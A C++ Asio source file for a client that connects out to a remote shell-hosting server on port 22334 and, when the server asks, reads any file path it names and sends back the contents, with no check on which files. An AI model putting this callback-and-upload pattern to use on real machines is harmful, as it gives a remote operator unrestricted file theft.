#include <standalone_asio.hpp>
#include <async_message.hpp>
#include <request.hpp>
#include <iostream>
#include <cstring>
#include <fstream>

using namespace asio::ip;

std::size_t get_file_size(const std::string& file_name)
{
    std::ifstream file(file_name, std::ios::binary | std::ios::ate);
    return file.tellg();
}

async_message::shared_ptr read_message(tcp::socket& socket, asio::strand& output_strand)
{
    async_message::shared_ptr async_message = async_message::make_shared(output_strand);
    asio::read(socket, asio::buffer(async_message->data(), async_message::header_length));
    async_message->decode_header();
    asio::read(socket, asio::buffer(async_message->body(), async_message->body_length()));

    std::cout << "message size: " << async_message->body_length() << "\n";
    std::cout.write(async_message->body(), async_message->body_length());
    std::cout << "\n";

    return async_message;
}

std::string get_file_name(async_message::shared_ptr& async_message)
{
    return std::string(async_message->body() + sizeof(request),
        async_message->body() + async_message->body_length());
}

void get_file(const std::string& file_name, tcp::socket& socket, asio::strand& output_strand)
{
    using asio::detail::socket_ops::host_to_network_long;

    std::fstream file(file_name, std::ios::in | std::ios::binary);
    std::uint32_t file_size = get_file_size(file_name);
    std::uint32_t error_code = 0;
    std::uint32_t request_code = 0;
    bool skip_send = false;
    if (!file.is_open())
    {
        std::cout << "Can't find file\n";
        error_code = 1;
        file_size = 0;
        skip_send = true;
    }
    error_code = host_to_network_long(error_code);
    file_size = host_to_network_long(file_size);
    request_code = host_to_network_long(request_code);
    async_message::shared_ptr async_message = async_message::make_shared(output_strand);
    std::memcpy(async_message->body(), &request_code, sizeof(std::uint32_t));
    std::memcpy(async_message->body() + sizeof(std::uint32_t), &error_code, sizeof(std::uint32_t));
    std::memcpy(async_message->body() + sizeof(std::uint32_t) * 2, &file_size, sizeof(std::uint32_t));
    async_message->set_body_length(sizeof(std::uint32_t) * 3);
    async_message->encode_header();
    asio::write(socket, asio::buffer(async_message->data(), async_message->length()));
    if (skip_send)
    {
        return;
    }
    
    while (std::size_t bytes_read = file.readsome(async_message->body(), async_message::max_body_length))
    {
        async_message->set_body_length(bytes_read);
        async_message->encode_header();
        asio::write(socket, asio::buffer(async_message->data(), async_message->length()));
        std::cout << "loop";
    }
}

void ping(tcp::socket& socket, asio::strand& output_strand)
{
     async_message::shared_ptr async_message = async_message::make_shared("PONG RECEIVED!", output_strand);
     asio::write(socket, asio::buffer(async_message->data(), async_message->length()));
     asio::write(socket, asio::buffer(async_message->data(), async_message->length()));
}

void execute(tcp::socket& socket, asio::strand& output_strand)
{
    auto async_message = read_message(socket, output_strand);
    request request(async_message);
    request.network_to_host();

    if (request.code == request::request_code::PING)
        ping(socket, output_strand);
    if (request.code == request::request_code::FILE)
        get_file(get_file_name(async_message), socket, output_strand);
}

void client()
{
    asio::io_service io;
    tcp::endpoint ep(address::from_string("127.0.0.1"), 22334);
    tcp::socket socket(io);
    socket.connect(ep);
    asio::strand output_strand(io);
    for (;;)
    {
        execute(socket, output_strand);
    }
}

void remote_client()
{
    asio::io_service io_service;
    tcp::resolver resolver(io_service);
    tcp::resolver::query query("ca3.shell.xShellz.com", "22334");
    tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
    tcp::socket socket(io_service);
    asio::connect(socket, endpoint_iterator);
    asio::strand output_strand(io_service);
    for (;;)
    {
        execute(socket, output_strand);
    }
}